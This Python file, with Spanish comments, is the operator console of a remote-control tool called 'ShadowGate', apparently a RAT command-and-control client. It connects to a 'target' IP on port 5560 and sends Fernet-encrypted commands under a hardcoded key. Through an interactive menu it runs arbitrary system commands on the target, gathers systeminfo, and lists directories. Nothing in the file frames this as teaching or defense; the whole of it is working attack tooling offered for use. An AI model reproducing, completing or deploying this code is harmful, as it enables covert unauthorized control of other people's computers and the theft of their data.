#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
from cryptography.fernet import Fernet
from termcolor import colored
import pyfiglet


class ShadowGateController:
    def __init__(self):
        self.target_ip = None
        self.socket = None
        self.connected = False

        # 🔑 CLAVE VÁLIDA Y PROBADA - 44 caracteres exactos
        self.encryption_key = 'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)

    def connect(self, target_ip):
        """Conectar al objetivo"""
        try:
            self.target_ip = target_ip
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((target_ip, 5560))
            self.connected = True
            print(colored(f"✅ Conectado a {target_ip}", 'green'))
            return True
        except Exception as e:
            print(colored(f"❌ Error conectando: {e}", 'red'))
            return False

    def send_command(self, command_type, data=None):
        """Enviar comando cifrado"""
        if not self.connected:
            print(colored("❌ No conectado. Usa connect() primero.", 'red'))
            return None

        try:
            command = {
                'type': command_type,
                'data': data or {}
            }

            # Cifrar comando
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())

            # Enviar tamaño + datos
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)

            # Recibir respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return None

            size = struct.unpack('!I', size_data)[0]
            response_data = b''

            while len(response_data) < size:
                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    break
                response_data += chunk

            # Descifrar respuesta
            decrypted_response = self.cipher.decrypt(response_data)
            return json.loads(decrypted_response.decode())

        except Exception as e:
            print(colored(f"❌ Error enviando comando: {e}", 'red'))
            return None

    def execute_command(self, cmd):
        """Ejecutar comando en el objetivo"""
        return self.send_command('system_command', {'command': cmd})

    def get_system_info(self):
        """Obtener información del sistema"""
        return self.execute_command("systeminfo")

    def file_explorer(self, path="C:\\"):
        """Explorar archivos"""
        return self.execute_command(f"dir \"{path}\"")

    def show_banner(self):
        """Mostrar banner"""
        banner = pyfiglet.figlet_format("SHADOWGATE", font="slant")
        print(colored(banner, 'cyan'))
        print(colored("🕶️  Remote Control System", 'yellow'))
        print("=" * 60)

    def interactive_menu(self):
        """Menú interactivo simple"""
        self.show_banner()

        while True:
            print("\n" + "=" * 50)
            print(colored("🎮 MENÚ DE CONTROL", 'magenta'))
            print("=" * 50)

            if self.target_ip:
                print(colored(f"Objetivo: {self.target_ip}", 'green'))
            else:
                print(colored("Sin objetivo conectado", 'yellow'))

            print("1. 📡 Conectar a objetivo")
            print("2. 🖥️  Información del sistema")
            print("3. 📁 Explorar archivos")
            print("4. 🚪 Desconectar")
            print("0. 🏃 Salir")
            print("=" * 50)

            choice = input("👉 Selecciona opción: ").strip()

            if choice == "1":
                target = input("IP del objetivo: ").strip()
                self.connect(target)

            elif choice == "2" and self.connected:
                result = self.get_system_info()
                if result and result.get('success'):
                    print(colored("🖥️  System Info:", 'green'))
                    print(result.get('output', ''))
                else:
                    print(colored("❌ Error obteniendo información", 'red'))

            elif choice == "3" and self.connected:
                path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
                result = self.file_explorer(path)
                if result and result.get('success'):
                    print(colored(f"📁 Contenido de {path}:", 'green'))
                    print(result.get('output', ''))
                else:
                    print(colored("❌ Error listando archivos", 'red'))

            elif choice == "4":
                if self.socket:
                    self.socket.close()
                self.connected = False
                self.target_ip = None
                print(colored("🔌 Desconectado", 'yellow'))

            elif choice == "0":
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida", 'red'))

            input("\n📍 Presiona Enter para continuar...")


# Función de prueba rápida
def test_connection(target_ip):
    """Probar conexión rápidamente"""
    controller = ShadowGateController()

    if controller.connect(target_ip):
        print("\n🧪 Probando comandos...")

        # Systeminfo
        print("1. Obteniendo systeminfo...")
        info = controller.get_system_info()
        if info and info.get('success'):
            print("✅ Systeminfo funcionando")
            print(info.get('output', '')[:200] + "...")  # Primeros 200 caracteres
        else:
            print("❌ Systeminfo falló")

        controller.socket.close()
    else:
        print("❌ No se pudo conectar")


if __name__ == "__main__":
    # Ejecutar menú interactivo
    controller = ShadowGateController()
    controller.interactive_menu()